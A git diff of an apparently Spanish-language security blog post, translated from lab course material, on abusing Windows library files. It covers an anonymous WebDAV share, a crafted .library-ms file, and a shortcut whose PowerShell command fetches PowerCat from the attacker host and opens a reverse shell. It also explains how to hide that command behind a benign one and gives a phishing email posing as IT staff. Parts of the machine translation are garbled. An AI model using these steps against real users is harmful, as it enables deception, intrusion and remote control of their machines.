@@ -224,8 +224,13 @@ shell.interactive()
             title: 'Abusing Windows Library Files',
             date: 'January 14, 2025',
             content: `
-            <p>A continuación, ejecutaremos WsgiDAV desde el **/inicio/kali/.local/bin** directorio. En el caso de que WsgiDAV se haya instalado mediante apt, la instalación el camino difiere y _WsgiDAV_ debe usarse como comando para iniciar el servidor durante todo el curso. El primer parámetro que proporcionaremos es **--anfitrión**, que especifica el host desde el que servir. vamos a escuchar todas las interfaces con **0.0.0.0**. A continuación, especificaremos la escucha. puerto con **--puerto=80** y deshabilitar la autenticación en nuestro recurso compartido con **--autenticación = anónimo**. Finalmente, configuraremos la raíz del directorio de nuestro WebDAV compartir.</p>
+            <p>El ataque de abuso de biblioteca de Windows es una técnica que aprovecha la funcionalidad legítima de los archivos de biblioteca en los sistemas operativos Windows para actividades maliciosas. Estos archivos, con extensión <b>.library-ms</b>, se utilizan para crear accesos directos personalizados que permiten a los usuarios acceder rápidamente a ubicaciones específicas, como carpetas o recursos compartidos en red. Sin embargo, esta funcionalidad puede ser manipulada para incluir rutas maliciosas o cargar archivos maliciosos desde servidores remotos.
+El concepto detrás de este ataque radica en la confianza implícita que el sistema otorga a estos archivos. Un atacante puede diseñar un archivo de biblioteca que apunte a un recurso remoto, como un servidor WebDAV controlado por el atacante. Cuando la víctima abre este archivo, se establece una conexión al recurso remoto, permitiendo al atacante entregar cargas útiles, robar datos o incluso ejecutar comandos en el sistema de la víctima.
 
+Este método es especialmente efectivo porque los archivos <b>.library-ms</b> no suelen levantar sospechas, ya que se utilizan como parte de la funcionalidad normal del sistema. Además, no requieren permisos elevados ni exploits sofisticados para ejecutarse, lo que los convierte en una opción atractiva para los atacantes.
+
+En un entorno controlado, como una máquina de prueba, este tipo de ataque puede demostrarse creando un archivo <b>.library-ms</b> que conecte a un recurso compartido remoto mediante WebDAV. Luego, se pueden incluir scripts maliciosos que activen un shell inverso o descarguen herramientas adicionales. Este enfoque destaca la importancia de comprender y mitigar los riesgos asociados con las funcionalidades legítimas del sistema que pueden ser manipuladas con fines maliciosos.</p>
+<p>A continuación, ejecutaremos WsgiDAV desde el <b>/inicio/kali/.local/bin</b> directorio. En el caso de que WsgiDAV se haya instalado mediante apt, la instalación el camino difiere y <i>WsgiDAV</i> debe usarse como comando para iniciar el servidor durante todo el curso. El primer parámetro que proporcionaremos es <b>--anfitrión</b>, que especifica el host desde el que servir. Vamos a escuchar todas las interfaces con <b>0.0.0.0</b>. A continuación, especificaremos la escucha. puerto con <b>--puerto=80</b> y deshabilitar la autenticación en nuestro recurso compartido con <b>--autenticación=anónimo</b>. Finalmente, configuraremos la raíz del directorio de nuestro WebDAV compartir.</p>
 <div class="code-block">
 <pre><code>
 kali@kali:~$ mkdir /home/kali/webdav
@@ -255,26 +260,22 @@ Running without configuration file.
  <img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/5377fb2c3624ec7bfb55d60f8196895a-csa_sc_webdavbrowser2.png"/>
 <br>
 
-<p>A continuación, creemos el archivo de biblioteca de Windows. usaremos **xfreerdp** a conectarse al _Cliente137_ máquina en **192.168.50.194** a través de RDP a preparar nuestro ataque. Podemos conectarnos al sistema con _offsec_ como el nombre de usuario y _Laboratorio_ como contraseña. Esto hará que sea mucho más fácil para para construir y probar nuestro archivo de biblioteca, y más tarde, nuestro archivo de acceso directo.
-Una vez conectados, encontraremos el Código de estudio visual aplicación en el escritorio, que usaremos para crear nuestra biblioteca archivo. Debemos tener en cuenta que también podríamos utilizar Bloc de notas para crear el archivo. Abramos VSC haciendo doble clic en el icono.</p>
+<p>A continuación, creemos el archivo de biblioteca de Windows. Usaremos <b>xfreerdp</b> a conectarse al <i>Cliente137</i> máquina en <b>192.168.50.194</b> a través de RDP para preparar nuestro ataque. Podemos conectarnos al sistema con <i>offsec</i> como el nombre de usuario y <i>Laboratorio</i> como contraseña. Esto hará que sea mucho más fácil para construir y probar nuestro archivo de biblioteca, y más tarde, nuestro archivo de acceso directo. Una vez conectados, encontraremos el <i>Código de estudio visual</i> aplicación en el escritorio, que usaremos para crear nuestra biblioteca archivo. Debemos tener en cuenta que también podríamos utilizar <i>Bloc de notas</i> para crear el archivo. Abramos VSC haciendo doble clic en el icono.</p>
 <img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/3c18f3689192eac43f9352a542fdba2c-csa_sc_win112.png"/>
 <br>
 
-<p>En la barra de menú, haremos clic en _archivo_ > _Nuevo archivo de texto_. entonces lo haremos guarde el archivo vacío como **config.Biblioteca-ms** en el _offsec_ del usuario de oficina. Tan pronto como guardemos el archivo con esta extensión de archivo, se muestra con un icono. Si bien el ícono no parece peligroso, sí Windows no lo utiliza habitualmente y, por lo tanto, puede generar sospechas. Para aumentar las posibilidades de que nuestra víctima ejecute nuestro archivo, vamos cambiar su apariencia.</p>
-<img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/d851cb673201245bd941d1299e76461d-csa_sc_vscempty3.png"/>
+<p>En la barra de menú, haremos clic en <i>archivo</i> > <i>Nuevo archivo de texto</i>. Entonces lo haremos guarde el archivo vacío como <b>config.Biblioteca-ms</b> en el <i>offsec</i> del usuario de oficina. Tan pronto como guardemos el archivo con esta extensión de archivo, se muestra con un icono. Si bien el ícono no parece peligroso, Windows no lo utiliza habitualmente y, por lo tanto, puede generar sospechas. Para aumentar las posibilidades de que nuestra víctima ejecute nuestro archivo, vamos a cambiar su apariencia.</p><img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/d851cb673201245bd941d1299e76461d-csa_sc_vscempty3.png"/>
 
 <p>El La siguiente lista muestra el XML completo.:</p>
+<img src="https://raw.githubusercontent.com/JJoosh/JJoosh.github.io/refs/heads/main/img/Library.png/>
 
-
-<p>Guardemos y cerremos el archivo en Visual Studio Code. entonces lo haremos haga doble clic en **config.Biblioteca-ms** archivo en el escritorio.</p>
+<p>Guardemos y cerremos el archivo en Visual Studio Code. Entonces lo haremos haga doble clic en <b>config.Biblioteca-ms</b> archivo en el escritorio.</p>
 <img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/7624182b026f1ec571a6f48745f17a76-csa_sc_openlib.png"/>
 
-<p>Cuando abrimos el directorio en el Explorador, encontramos el creado previamente **prueba.txt** archivo que colocamos en el recurso compartido WebDAV. Por lo tanto, el El archivo de biblioteca funciona e incorpora la conexión al recurso compartido WebDAV..</p>
+<p>Cuando abrimos el directorio en el Explorador, encontramos el creado previamente <b>prueba.txt</b> archivo que colocamos en el recurso compartido WebDAV. Por lo tanto, el archivo de biblioteca funciona e incorpora la conexión al recurso compartido WebDAV.<
 <p>Muy lindo!</p>
 
-
-<p>Creemos el acceso directo en el escritorio para el _offsec_ usuario. Para esto, haremos clic derecho en el escritorio y haremos clic en _nuevo_ luego en _Atajo_. en el _Crear acceso directo_ ventana, podemos ingresar una ruta a un programa junto con argumentos, que serán señalados por el atajo. Apuntaremos el acceso directo a PowerShell y usaremos otro descargue la base para cargar PowerCat desde nuestra máquina Kali e inicie un caparazón inverso.
-</p>
+<p>Creemos el acceso directo en el escritorio para el <i>offsec</i> usuario. Para esto, haremos clic derecho en el escritorio y haremos clic en <i>nuevo</i>, luego en <i>Atajo</i>. En el <i>Crear acceso directo</i> ventana, podemos ingresar una ruta a un programa junto con argumentos, que serán señalados por el atajo. Apuntaremos el acceso directo a PowerShell y usaremos otro descargue la base para cargar PowerCat desde nuestra máquina Kali e inicie un caparazón inverso.</p>
 
 <p>Usaremos el comando que aprovechamos anteriormente.:</p>
 <div class="code-block">
@@ -287,15 +288,12 @@ powercat -c 192.168.119.3 -p 4444 -e powershell"
 <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
 </div> 
 
-<p>Ingresaremos este comando en el campo de entrada y haremos clic _Próximo_.</p>
+<p>Ingresaremos este comando en el campo de entrada y haremos clic Next.</p>
 <img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/2ad68e3a33e8ba87b2a27876c2bbf6f5-csa_sc_createshortcut2.png"/>
 
-<p>
-Si esperamos que nuestras víctimas sean lo suficientemente conocedoras de la tecnología como para realmente Compruebe hacia dónde apuntan los archivos de acceso directo, podemos usar un truco útil. Dado que nuestro comando proporcionado parece muy sospechoso, podríamos simplemente poner un delimitador y comando benigno detrás de él para impulsar el comando malicioso fuera del área visible en el menú de propiedades del archivo. Si un usuario fuera para verificar el acceso directo, solo verán el comando benigno.</p>
-<p>En la siguiente ventana, ingresemos **configuración_automática** como el nombre del archivo de acceso directo y haga clic en _Finalizar_ para crear el archivo.</p>
-<p>En nuestra máquina Kali, iniciemos un servidor web Python3 en el puerto 8000 dónde **powercat.ps1** está ubicado e inicia un oyente Netcat en el puerto 4444.</p>
-
+<p>Si esperamos que nuestras víctimas sean lo suficientemente conocedoras de la tecnología como para realmente comprobar hacia dónde apuntan los archivos de acceso directo, podemos usar un truco útil. Dado que nuestro comando proporcionado parece muy sospechoso, podríamos simplemente poner un delimitador y comando benigno detrás de él para impulsar el comando malicioso fuera del área visible en el menú de propiedades del archivo. Si un usuario fuera a verificar el acceso directo, solo verá el comando benigno.</p> <p>En la siguiente ventana, ingresemos <b>configuración_automática</b> como el nombre del archivo de acceso directo y haga clic en <i>Finalizar</i> para crear el archivo.</p> <p>En nuestra máquina Kali, iniciemos un servidor web Python3 en el puerto 8000 donde <b>powercat.ps1</b> está ubicado e inicia un oyente Netcat en el puerto 4444.</p>
 <p>El pretexto es un aspecto importante de este ataque del lado del cliente. en esto En este caso podríamos decirle al objetivo que somos un nuevo miembro del equipo de TI. y necesitamos configurar todos los sistemas del cliente para la nueva gestión. plataforma. También les diremos que hemos incluido un fácil de usar programa de configuración. Un correo electrónico de ejemplo para utilizar en una evaluación real se muestra a continuación.</p>
+
 <div class="code-block">
 <pre><code>
 Hello! My name is Dwight, and I'm a new member of the IT Team. 
@@ -312,7 +310,7 @@ know!
 <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
 </div> 
 
-<p>Ahora copiemos **configuración_automática.lnk** y **config.Biblioteca-ms** a nuestro directorio WebDAV en nuestra máquina Kali.</p>
+<p>Ahora copiemos <b>configuración_automática.lnk</b> y <b>config.Biblioteca-ms</b> a nuestro directorio WebDAV en nuestra máquina Kali.</p>
 <p>Ahora solo nos queda efectuar el ataque mandando el correo al servidor SMTP y esperar nuestra revshell</p>
 
 <div class="code-block">
